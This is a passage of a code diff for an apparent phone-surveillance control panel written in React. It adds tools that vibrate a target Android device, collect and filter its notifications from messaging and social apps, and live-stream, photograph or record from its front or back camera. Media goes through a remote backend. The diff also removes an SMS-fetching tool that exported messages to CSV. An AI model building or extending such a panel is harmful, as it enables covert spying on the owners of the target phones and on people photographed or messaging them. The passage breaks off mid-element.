+                                                <input
+                                                    type="range"
+                                                    min="0.5"
+                                                    max="10"
+                                                    step="0.5"
+                                                    value={vibrationDuration / 1000}
+                                                    onChange={(e) => setVibrationDuration(parseFloat(e.target.value) * 1000)}
+                                                    className="flex-1 accent-orange-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
+                                                />
+                                                <span className="text-sm font-bold w-12 text-right">{vibrationDuration / 1000}s</span>
+                                            </div>
+                                        </div>
+
+                                        <button
+                                            onClick={triggerVibration}
+                                            disabled={!selectedDeviceId}
+                                            className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId ? 'bg-gradient-to-r from-orange-500 to-red-500 hover:scale-[1.02] shadow-lg shadow-orange-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
+                                        >
+                                            <svg className="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+                                            Vibrate Now
+                                        </button>
+                                    </div>
+                                </div>
+                            )}
+
+                            {/* Notification Monitoring Tool */}
+                            {selectedTool === 'notifications' && (
+                                <div className="space-y-4">
+                                    {/* Permission Info Banner */}
+                                    {!isMonitoringNotifications && notifications.length === 0 && (
+                                        <div className="flex items-start gap-3 p-4 rounded-xl bg-amber-500/10 border border-amber-500/20">
+                                            <svg className="w-5 h-5 text-amber-400 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"></path></svg>
+                                            <div>
+                                                <p className="text-sm font-medium text-amber-300">Notification Access Required</p>
+                                                <p className="text-xs text-amber-400/60 mt-1">To receive notifications from the device, you must manually enable <strong>Notification Listener</strong> permission in the device&apos;s Settings → Apps → Special Access → Notification Access.</p>
+                                            </div>
+                                        </div>
+                                    )}
+                                    {/* App Filter Bar */}
+                                    <div className="space-y-3">
+                                        <div className="flex items-center justify-between">
+                                            <span className="text-xs font-semibold uppercase tracking-wider text-white/30">Filter by App</span>
+                                            {notifications.filter(n => !selectedDeviceId || n.deviceId === selectedDeviceId).length > 0 && (
+                                                <span className="px-2 py-0.5 bg-cyan-500/15 text-cyan-400 text-[10px] font-bold rounded-full">
+                                                    {notifications.filter(n => {
+                                                        if (selectedDeviceId && n.deviceId !== selectedDeviceId) return false;
+                                                        if (selectedNotifApp === 'all') return true;
+                                                        const filter = notifAppFilters.find(f => f.key === selectedNotifApp);
+                                                        return filter?.packages.some(p => n.packageName?.includes(p));
+                                                    }).length} results
+                                                </span>
+                                            )}
+                                        </div>
+                                        <div className="flex gap-1.5 overflow-x-auto pb-1" style={{ scrollbarWidth: 'none' }}>
+                                            {notifAppFilters.map(app => (
+                                                <button
+                                                    key={app.key}
+                                                    onClick={() => setSelectedNotifApp(app.key)}
+                                                    className={`flex items-center gap-2 px-3 py-2 rounded-full transition-all flex-shrink-0 ${selectedNotifApp === app.key
+                                                        ? 'shadow-lg scale-[1.03]'
+                                                        : 'bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.06]'
+                                                        }`}
+                                                    style={selectedNotifApp === app.key ? {
+                                                        background: `linear-gradient(135deg, ${app.color}25, ${app.color}10)`,
+                                                        border: `1px solid ${app.color}50`,
+                                                        boxShadow: `0 0 20px ${app.color}15`
+                                                    } : {}}
+                                                >
+                                                    {app.key === 'all' ? (
+                                                        <svg className="w-4 h-4" style={{ color: selectedNotifApp === app.key ? app.color : 'rgba(255,255,255,0.4)' }} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                                    ) : (
+                                                        <img src={app.img} alt={app.label} className="w-4 h-4 rounded-[4px] object-contain" />
+                                                    )}
+                                                    <span className={`text-xs font-medium whitespace-nowrap ${selectedNotifApp === app.key ? 'text-white' : 'text-white/40'
+                                                        }`}>{app.label}</span>
+                                                </button>
+                                            ))}
+                                        </div>
+                                    </div>
+
+                                    {/* Search */}
+                                    <div className="relative">
+                                        <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                                        <input
+                                            type="text"
+                                            placeholder="Search by app or content..."
+                                            value={notificationSearch}
+                                            onChange={(e) => setNotificationSearch(e.target.value)}
+                                            className="w-full bg-white/5 border border-white/10 rounded-xl pl-10 pr-4 py-3 text-sm focus:outline-none focus:border-cyan-500/50 transition-colors"
+                                        />
+                                    </div>
+
+                                    {/* Empty State */}
+                                    {notifications.length === 0 && (
+                                        <div className="text-center py-12">
+                                            <svg className="w-16 h-16 mx-auto mb-4 text-white/10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                            <p className="text-white/40 font-medium">No notifications yet</p>
+                                            <p className="text-white/20 text-xs mt-1">Notifications will appear here automatically</p>
+                                        </div>
+                                    )}
+
+                                    {/* Notification Cards */}
+                                    <div className="space-y-2 max-h-[65vh] overflow-y-auto pr-1" style={{ scrollbarWidth: 'thin', scrollbarColor: 'rgba(255,255,255,0.1) transparent' }}>
+                                        {notifications
+                                            .filter(n => {
+                                                // Per-device filter
+                                                if (selectedDeviceId && n.deviceId && n.deviceId !== selectedDeviceId) return false;
+                                                // App filter
+                                                if (selectedNotifApp !== 'all') {
+                                                    const filter = notifAppFilters.find(f => f.key === selectedNotifApp);
+                                                    if (filter && !filter.packages.some(p => n.packageName?.includes(p))) return false;
+                                                }
+                                                // Search filter
+                                                if (!notificationSearch) return true;
+                                                const q = notificationSearch.toLowerCase();
+                                                return (n.appName?.toLowerCase().includes(q) || n.title?.toLowerCase().includes(q) || n.text?.toLowerCase().includes(q));
+                                            })
+                                            .map((notif, idx) => {
+                                                const timeAgo = (() => {
+                                                    const diff = Date.now() - (notif.receivedAt || notif.timestamp);
+                                                    if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
+                                                    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
+                                                    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
+                                                    return new Date(notif.timestamp).toLocaleDateString();
+                                                })();
+
+                                                // Determine if this is a new notification (less than 30s old)
+                                                const isNew = (Date.now() - (notif.receivedAt || notif.timestamp)) < 30000;
+
+                                                // Map category to color
+                                                const categoryColors: Record<string, string> = {
+                                                    msg: 'border-l-green-500',
+                                                    email: 'border-l-blue-500',
+                                                    call: 'border-l-yellow-500',
+                                                    social: 'border-l-pink-500',
+                                                    promo: 'border-l-orange-500',
+                                                };
+                                                const borderColor = categoryColors[notif.category] || 'border-l-cyan-500';
+
+                                                return (
+                                                    <button
+                                                        key={`${notif.id}-${idx}`}
+                                                        onClick={() => setSelectedNotification(notif)}
+                                                        className={`w-full text-left p-3 rounded-xl border border-white/10 hover:bg-white/10 transition-all border-l-4 ${borderColor} ${notif.dismissed ? 'opacity-40' : ''} ${isNew ? 'bg-cyan-500/10 ring-1 ring-cyan-500/30' : 'bg-white/5'}`}
+                                                    >
+                                                        <div className="flex items-start gap-3">
+                                                            {notif.icon ? (
+                                                                <img
+                                                                    src={`data:image/png;base64,${notif.icon}`}
+                                                                    alt={notif.appName}
+                                                                    className="w-8 h-8 rounded-lg flex-shrink-0"
+                                                                />
+                                                            ) : (
+                                                                <div className="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center flex-shrink-0">
+                                                                    <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                                                </div>
+                                                            )}
+                                                            <div className="flex-1 min-w-0">
+                                                                <div className="flex items-center justify-between">
+                                                                    <span className="text-xs font-medium text-cyan-400">{notif.appName}</span>
+                                                                    <div className="flex items-center gap-1.5 flex-shrink-0">
+                                                                        {isNew && <span className="w-1.5 h-1.5 bg-cyan-400 rounded-full animate-pulse" />}
+                                                                        <span className="text-[10px] text-white/30">{timeAgo}</span>
+                                                                    </div>
+                                                                </div>
+                                                                {notif.title && <p className={`text-sm truncate ${isNew ? 'font-bold text-white' : 'font-semibold text-white/90'}`}>{notif.title}</p>}
+                                                                {notif.text && <p className="text-xs text-white/50 line-clamp-2 mt-0.5">{notif.text}</p>}
+                                                            </div>
+                                                        </div>
+                                                    </button>
+                                                );
+                                            })
+                                        }
+                                    </div>
+                                </div>
+                            )}
+
+                            {/* Notification Detail Modal */}
+                            {selectedNotification && (
+                                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
+                                    <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-lg w-full mx-4 animate-scaleIn">
+                                        <div className="flex justify-between items-start mb-4">
+                                            <div className="flex items-center gap-3">
+                                                {selectedNotification.icon ? (
+                                                    <img
+                                                        src={`data:image/png;base64,${selectedNotification.icon}`}
+                                                        alt={selectedNotification.appName}
+                                                        className="w-10 h-10 rounded-xl"
+                                                    />
+                                                ) : (
+                                                    <div className="w-10 h-10 rounded-xl bg-cyan-500/20 flex items-center justify-center">
+                                                        <svg className="w-5 h-5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
+                                                    </div>
+                                                )}
+                                                <div>
+                                                    <h3 className="text-lg font-bold">{selectedNotification.appName}</h3>
+                                                    <p className="text-xs text-white/40">
+                                                        {new Date(selectedNotification.timestamp).toLocaleString()}
+                                                    </p>
+                                                </div>
+                                            </div>
+                                            <button
+                                                onClick={() => setSelectedNotification(null)}
+                                                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
+                                            >
+                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                            </button>
+                                        </div>
+                                        {selectedNotification.title && (
+                                            <div className="mb-3">
+                                                <p className="text-sm font-semibold">{selectedNotification.title}</p>
+                                            </div>
+                                        )}
+                                        <div className="p-4 rounded-xl bg-white/5 border border-white/10 mb-4">
+                                            <p className="text-sm whitespace-pre-wrap">{selectedNotification.text || 'No content'}</p>
+                                            {selectedNotification.subText && (
+                                                <p className="text-xs text-white/40 mt-2">{selectedNotification.subText}</p>
+                                            )}
+                                        </div>
+                                        <div className="flex gap-2 flex-wrap">
+                                            <span className="text-xs px-3 py-1 rounded-full bg-cyan-500/20 text-cyan-400">
+                                                {selectedNotification.packageName}
+                                            </span>
+                                            {selectedNotification.category && selectedNotification.category !== 'unknown' && (
+                                                <span className="text-xs px-3 py-1 rounded-full bg-white/10 text-white/60">
+                                                    {selectedNotification.category}
+                                                </span>
+                                            )}
+                                            {selectedNotification.isOngoing && (
+                                                <span className="text-xs px-3 py-1 rounded-full bg-yellow-500/20 text-yellow-400">Ongoing</span>
+                                            )}
+                                            {selectedNotification.dismissed && (
+                                                <span className="text-xs px-3 py-1 rounded-full bg-red-500/20 text-red-400">Dismissed</span>
+                                            )}
+                                        </div>
+                                    </div>
+                                </div>
+                            )}
+
+                            {/* Camera Tool - Compact UI */}
+                            {selectedTool === 'camera' && (
+                                <div className="space-y-4">
+                                    {/* Live Feed Container */}
+                                    <div className={`bg-gray-900 border border-white/10 rounded-xl overflow-hidden ${isFullscreen ? 'fixed inset-2 z-50 flex flex-col' : ''}`}>
+                                        {/* Compact Header - Hidden in fullscreen */}
+                                        {!isFullscreen && (
+                                            <div className="px-3 py-2 border-b border-white/10 flex items-center justify-between bg-black/40">
+                                                <div className="flex items-center gap-2">
+                                                    <div className={`w-2 h-2 rounded-full ${isLiveStreaming ? 'bg-red-500 animate-pulse' : isRecording ? 'bg-orange-500 animate-pulse' : isVideoUploading ? 'bg-blue-500 animate-pulse' : 'bg-green-500/50'}`} />
+                                                    <span className="text-xs text-white/60 font-mono">
+                                                        {isLiveStreaming ? 'LIVE' : isRecording ? `REC ${recordingProgress.current}s` : isVideoUploading ? 'UPLOADING...' : selectedDeviceId ? selectedDeviceId.substring(0, 8) : 'NO DEVICE'}
+                                                    </span>
+                                                </div>
+                                                <div className="flex items-center gap-2">
+                                                    {/* Quality Selector */}
+                                                    <select
+                                                        value={streamQuality}
+                                                        onChange={(e) => setStreamQuality(Number(e.target.value))}
+                                                        className="bg-black/50 border border-white/20 rounded px-1.5 py-0.5 text-xs text-cyan-400 font-mono"
+                                                        disabled={isLiveStreaming}
+                                                    >
+                                                        <option value={144}>144p</option>
+                                                        <option value={240}>240p</option>
+                                                        <option value={360}>360p</option>
+                                                        <option value={480}>480p</option>
+                                                        <option value={720}>720p</option>
+                                                    </select>
+                                                    {/* Fullscreen */}
+                                                    <button
+                                                        onClick={() => setIsFullscreen(true)}
+                                                        className="p-1.5 rounded bg-white/10 text-white/60 hover:bg-white/20"
+                                                    >
+                                                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"></path></svg>
+                                                    </button>
+                                                </div>
+                                            </div>
+                                        )}
+
+                                        {/* Main Viewport */}
+                                        <div className={`relative bg-black flex items-center justify-center overflow-hidden ${isFullscreen ? 'flex-1' : 'aspect-video'}`}>
+                                            {/* Live Stream View */}
+                                            {isLiveStreaming && liveFrame ? (
+                                                <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live" />
+                                            ) : isRecording ? (
+                                                /* Compact Recording Animation */
+                                                <div className="flex flex-col items-center gap-3">
+                                                    <div className="relative w-16 h-16">
+                                                        <div className="absolute inset-0 border-2 border-red-500/30 rounded-full"></div>
+                                                        <div className="absolute inset-0 border-2 border-red-500 rounded-full border-t-transparent animate-spin"></div>
+                                                        <div className="absolute inset-2 bg-red-500/20 rounded-full flex items-center justify-center">
+                                                            <span className="text-xl font-bold text-red-500">{recordingProgress.current}</span>
+                                                        </div>
+                                                    </div>
+                                                    <div className="text-center">
+                                                        <p className="text-red-400 text-sm font-mono">● REC</p>
+                                                        <div className="w-32 mt-2 bg-white/10 rounded-full h-1.5 overflow-hidden">
+                                                            <div className="bg-red-500 h-full transition-all duration-1000" style={{ width: `${(recordingProgress.current / recordingProgress.total) * 100}%` }}></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            ) : isVideoUploading ? (
+                                                /* Upload Status */
+                                                <div className="flex flex-col items-center gap-3">
+                                                    <div className="w-12 h-12 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                                                    <p className="text-blue-400 text-sm font-mono">Uploading video...</p>
+                                                </div>
+                                            ) : (
+                                                /* Idle State with Animation */
+                                                <div className="text-center">
+                                                    <div className="relative w-16 h-16 mx-auto mb-2">
+                                                        <div className="absolute inset-0 border-2 border-cyan-500/30 rounded-full animate-ping"></div>
+                                                        <div className="absolute inset-0 border-2 border-cyan-500/20 rounded-full flex items-center justify-center">
+                                                            <svg className="w-8 h-8 text-cyan-500/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                                        </div>
+                                                    </div>
+                                                    <p className="text-white/30 text-xs">Ready</p>
+                                                </div>
+                                            )}
+
+                                            {/* Camera Switch - Only show when NOT live streaming and not in fullscreen */}
+                                            {!isFullscreen && !isLiveStreaming && (
+                                                <button
+                                                    onClick={() => setCameraMode(prev => prev === 'back' ? 'front' : 'back')}
+                                                    className={`absolute top-2 left-2 flex items-center gap-1.5 px-2 py-1 rounded-lg text-xs font-bold ${cameraMode === 'front' ? 'bg-purple-500/80 text-white' : 'bg-cyan-500/80 text-white'}`}
+                                                >
+                                                    <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                                    {cameraMode.toUpperCase()}
+                                                </button>
+                                            )}
+
+                                            {/* Fullscreen Close Button */}
+                                            {isFullscreen && (
+                                                <button
+                                                    onClick={() => setIsFullscreen(false)}
+                                                    className="absolute top-3 right-3 p-2 rounded-full bg-black/50 text-white hover:bg-black/70"
+                                                >
+                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                                </button>
+                                            )}
+
+                                            {/* Error */}
+                                            {cameraError && (
+                                                <div className="absolute bottom-2 left-2 right-2 bg-red-500/90 text-white text-xs p-2 rounded">⚠️ {cameraError}</div>
+                                            )}
+                                        </div>
+
+                                        {/* Control Panel - Fullscreen shows only stop buttons */}
+                                        <div className={`p-3 bg-black/60 ${isFullscreen ? 'flex justify-center' : ''}`}>
+                                            {isFullscreen ? (
+                                                /* Fullscreen: Only show stop button for active operation */
+                                                <div className="flex gap-3">
+                                                    {isLiveStreaming && (
+                                                        <button
+                                                            onClick={() => {
+                                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                                setIsLiveStreaming(false);
+                                                                setLiveFrame(null);
+                                                                setIsFullscreen(false);
+                                                            }}
+                                                            className="px-6 py-2 rounded-lg bg-red-600 text-white font-bold flex items-center gap-2"
+                                                        >
+                                                            ⏹ Stop Live
+                                                        </button>
+                                                    )}
+                                                    {isRecording && (
+                                                        <button
+                                                            onClick={() => {
+                                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                                setIsRecording(false);
+                                                                setIsVideoUploading(true);
+                                                                setIsFullscreen(false);
+                                                            }}
+                                                            className="px-6 py-2 rounded-lg bg-red-600 text-white font-bold flex items-center gap-2"
+                                                        >
+                                                            ⏹ Stop Recording
+                                                        </button>
+                                                    )}
+                                                    {!isLiveStreaming && !isRecording && (
+                                                        <button
+                                                            onClick={() => setIsFullscreen(false)}
+                                                            className="px-6 py-2 rounded-lg bg-white/20 text-white font-bold"
+                                                        >
+                                                            Exit Fullscreen
+                                                        </button>
+                                                    )}
+                                                </div>
+                                            ) : (
+                                                /* Normal Mode: All controls */
+                                                <div className="flex gap-2">
+                                                    {/* GO LIVE */}
+                                                    <button
+                                                        onClick={() => {
+                                                            if (!selectedDeviceId) return;
+                                                            if (isLiveStreaming) {
+                                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                                setIsLiveStreaming(false);
+                                                                setLiveFrame(null);
+                                                            } else {
+                                                                socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: streamQuality });
+                                                                setIsLiveStreaming(true);
+                                                            }
+                                                        }}
+                                                        className={`flex-1 py-2 px-3 rounded-lg font-bold text-sm flex items-center justify-center gap-1.5 transition-all ${isLiveStreaming ? 'bg-red-600 text-white' : 'bg-cyan-600 text-white hover:bg-cyan-500'}`}
+                                                        disabled={!selectedDeviceId || isRecording || isVideoUploading}
+                                                    >
+                                                        {isLiveStreaming ? '⏹ Stop' : '📹 Live'}
+                                                    </button>
+
+                                                    {/* SNAP */}
+                                                    <button
+                                                        onClick={() => {
+                                                            if (!selectedDeviceId) return;
+                                                            setIsCapturingPhoto(true);
+                                                            socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
+                                                        }}
+                                                        className="flex-1 py-2 px-3 rounded-lg bg-green-600 text-white font-bold text-sm flex items-center justify-center gap-1.5 hover:bg-green-500"
+                                                        disabled={!selectedDeviceId || isCapturingPhoto || isLiveStreaming}
+                                                    >
+                                                        {isCapturingPhoto ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : '📸'} Photo
+                                                    </button>
+
+                                                    {/* REC */}
+                                                    {!isRecording ? (
+                                                        <div className="flex-1 flex flex-col gap-1">
+                                                            <div className="flex gap-0.5 justify-center">
+                                                                {[{ label: '1m', value: 60 }, { label: '2m', value: 120 }, { label: '5m', value: 300 }].map((opt) => (
+                                                                    <button
+                                                                        key={opt.value}
+                                                                        onClick={() => setRecordingDuration(opt.value)}
+                                                                        className={`px-1.5 py-0.5 rounded text-xs font-bold ${recordingDuration === opt.value ? 'bg-orange-500 text-white' : 'bg-white/10 text-white/50'}`}
+                                                                    >
+                                                                        {opt.label}
+                                                                    </button>
+                                                                ))}
+                                                            </div>
+                                                            <button
+                                                                onClick={() => {
+                                                                    if (!selectedDeviceId) return;
+                                                                    socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
+                                                                    setIsRecording(true);
+                                                                    setRecordingProgress({ current: 0, total: recordingDuration });
+                                                                }}
+                                                                className="py-2 px-3 rounded-lg bg-orange-600 text-white font-bold text-sm flex items-center justify-center gap-1.5 hover:bg-orange-500"
+                                                                disabled={!selectedDeviceId || isLiveStreaming || isVideoUploading}
+                                                            >
+                                                                🎬 Rec
+                                                            </button>
+                                                        </div>
+                                                    ) : (
+                                                        <button
+                                                            onClick={() => {
+                                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                                setIsRecording(false);
+                                                                setIsVideoUploading(true);
+                                                            }}
+                                                            className="flex-1 py-2 px-3 rounded-lg bg-red-600 text-white font-bold text-sm animate-pulse"
+                                                        >
+                                                            ⏹ Stop ({recordingProgress.current}s)
+                                                        </button>
+                                                    )}
+                                                </div>
+                                            )}
+                                        </div>
+                                    </div>
+
+                                    {/* Captured Media Gallery */}
+                                    {capturedMedia.length > 0 && (
+                                        <div className="bg-white/5 border border-white/10 p-3 rounded-xl">
+                                            <div className="flex justify-between items-center mb-3">
+                                                <span className="text-sm text-white/60 font-mono">{capturedMedia.length} Captures</span>
+                                                <button onClick={() => setCapturedMedia([])} className="text-xs text-white/40 hover:text-white">Clear</button>
+                                            </div>
+                                            <div className="grid grid-cols-3 sm:grid-cols-4 lg:grid-cols-5 gap-2">
+                                                {capturedMedia.map((media, i) => {
+                                                    const isUrl = media.data.startsWith('/') || media.data.startsWith('http');
+                                                    const src = isUrl
+                                                        ? (media.data.startsWith('http') ? media.data : `https://backend-api-gallery.onrender.com${media.data}`)
+                                                        : media.type === 'video' ? `data:video/mp4;base64,${media.data}` : `data:image/jpeg;base64,${media.data}`;
+
+                                                    return (
+                                                        <div
+                                                            key={i}
+                                                            onClick={() => setPreviewCapture({ type: media.type, data: src })}
+                                                            className="group relative aspect-square bg-black rounded-lg overflow-hidden border border-white/10 cursor-pointer hover:border-white/30"
+                                                        >
+                                                            {media.type === 'photo' ? (
+                                                                <img src={src} className="w-full h-full object-cover" alt="" />
+                                                            ) : (
+                                                                <div className="relative w-full h-full">
+                                                                    <video src={src} className="w-full h-full object-cover" />
+                                                                    <div className="absolute inset-0 flex items-center justify-center bg-black/40">
+                                                                        <span className="text-white text-lg">▶</span>
+                                                                    </div>
+                                                                </div>
+                                                            )}
+                                                            <div className="absolute bottom-0 left-0 right-0 bg-black/60 px-1 py-0.5 text-[10px] text-white/60 text-center">
+                                                                {new Date(media.timestamp).toLocaleTimeString()}
+                                                            </div>
+                                                        </div>
+                                                    );
+                                                })}
+                                            </div>
+                                        </div>
+                                    )}
+
+                                    {/* Preview Modal */}
+                                    {previewCapture && (
+                                        <div
+                                            className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-4"
+                                            onClick={() => setPreviewCapture(null)}
+                                        >
+                                            <button className="absolute top-4 right-4 text-white p-2 hover:bg-white/10 rounded-full">
+                                                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                            </button>
+                                            {previewCapture.type === 'photo' ? (
+                                                <img src={previewCapture.data} className="max-w-full max-h-[90vh] object-contain rounded-lg" alt="Preview" />
+                                            ) : (
+                                                <video src={previewCapture.data} controls autoPlay className="max-w-full max-h-[90vh] rounded-lg" />
+                                            )}
                                         </div>
                                     )}
                                 </div>
                             )}
                         </>
                     )}
-
-                    {/* SMS Tool */}
-                    {selectedTool === 'sms' && (
-                        <div className="space-y-4">
-                            <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
-                                <div className="flex gap-2">
-                                    <button
-                                        onClick={fetchSms}
-                                        disabled={!selectedDeviceId || isFetchingSms}
-                                        className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
-                                    >
-                                        {isFetchingSms ? (
-                                            <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
-                                        ) : (
-                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
-                                        )}
-                                        {smsList.length > 0 ? 'Fetch New SMS' : 'Fetch All SMS'}
-                                    </button>
-                                    {smsList.length > 0 && (
-                                        <>
-                                            <button
-                                                onClick={resetSmsSync}
-                                                className="px-3 py-2 rounded-lg border border-white/10 bg-white/5 text-white/70 text-sm hover:bg-white/10 transition-colors"
-                                            >
-                                                Reset
-                                            </button>
-                                            <button
-                                                onClick={downloadSmsAsCsv}
-                                                className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
-                                            >
-                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
-                                                CSV
-                                            </button>
-                                        </>
-                                    )}
-                                </div>
-                                <div className="relative w-full sm:w-64">
-                                    <input
-                                        type="text"
-                                        placeholder="Search SMS..."
-                                        value={smsSearchQuery}
-                                        onChange={(e) => setSmsSearchQuery(e.target.value)}
-                                        className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
-                                    />
-                                    <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-                                </div>
-                            </div>
-
-                            {smsList.length > 0 ? (
-                                <div className="space-y-2 max-h-[60vh] overflow-y-auto">
-                                    <p className="text-xs text-white/40 mb-2">{filteredSms.length} messages</p>
-                                    {filteredSms.map((sms: any) => (
-                                        <div
-                                            key={sms.id}
-                                            onClick={() => setSelectedSms(sms)}
-                                            className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all cursor-pointer"
-                                        >
-                                            <div className="flex justify-between items-start mb-2">
-                                                <span className="font-medium text-sm">{sms.address}</span>
-                                                <span className="text-xs text-white/40">
